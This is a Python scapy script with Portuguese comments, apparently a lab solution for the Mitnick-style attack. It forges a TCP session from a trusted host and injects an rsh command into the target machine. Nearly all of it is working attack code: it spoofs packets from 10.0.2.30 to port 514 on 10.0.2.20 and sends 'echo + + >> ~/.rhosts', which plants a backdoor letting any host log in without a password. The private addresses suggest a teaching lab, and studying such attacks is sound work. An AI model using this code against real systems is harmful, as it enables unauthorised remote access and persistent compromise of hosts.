from scapy.all import AsyncSniffer, IP, TCP, Raw, send
from handshake import forge_handshake

XTERMINAL_IP = "10.0.2.20"
TRUSTED_IP = "10.0.2.30"
TARGET_PORT = 514

RSH_LPORT = "0"       # porta stderr (0 = não usa canal separado)
RSH_LUSER = "root"    # usuário local (lado cliente / servidor confiável)
RSH_RUSER = "root"    # usuário remoto (no xTerminal)
RSH_CMD   = "echo + + >> ~/.rhosts"


def build_rsh_payload(lport: str, luser: str, ruser: str, cmd: str) -> bytes:
    # Formato RSH: "<lport>\0<luser>\0<ruser>\0<cmd>\0"
    return f"{lport}\x00{luser}\x00{ruser}\x00{cmd}\x00".encode()


def send_rsh_command(seq: int, ack: int, sport: int, cmd: str = RSH_CMD) -> None:
    payload = build_rsh_payload(RSH_LPORT, RSH_LUSER, RSH_RUSER, cmd)

    # Sniffa o \x00 de aceitação do rshd antes de enviar (para confirmar no relatório)
    sniffer = AsyncSniffer(
        filter=f"src host {XTERMINAL_IP} and dst host {TRUSTED_IP} and tcp port {TARGET_PORT}",
        count=1,
        timeout=5,
    )
    sniffer.start()

    print(f"[*] Enviando payload RSH: {payload!r}")
    data_pkt = IP(dst=XTERMINAL_IP, src=TRUSTED_IP) / TCP(
        sport=sport,
        dport=TARGET_PORT,
        flags="PA",   # PSH + ACK: entrega imediata ao processo rshd
        seq=seq,
        ack=ack,
    ) / Raw(load=payload)
    send(data_pkt, verbose=False)

    sniffer.join()

    if sniffer.results:
        resp = sniffer.results[0]
        raw = bytes(resp[Raw].load) if resp.haslayer(Raw) else b""
        if raw == b"\x00":
            print("[+] rshd aceitou a conexão (recebeu \\x00).")
        elif raw:
            print(f"[-] rshd REJEITOU a conexão: {raw!r} — abortando.")
            return
    else:
        print("[!] Sem resposta do rshd — comando pode ter sido executado mesmo assim.")

    print(f"[+] Comando enviado: '{cmd}'")


def rsh_attack(cmd: str = RSH_CMD) -> None:
    print("=" * 55)
    print("[ETAPA 3] Forjando handshake TCP...")
    result = forge_handshake()
    if result is None:
        return
    seq, ack, sport = result

    print("=" * 55)
    print("[ETAPA 4] Enviando comando RSH via sessão forjada...")
    send_rsh_command(seq, ack, sport, cmd)
    print("=" * 55)
    print(f"[+] Ataque concluído. Verifique ~/.rhosts no xTerminal.")


if __name__ == "__main__":
    rsh_attack()
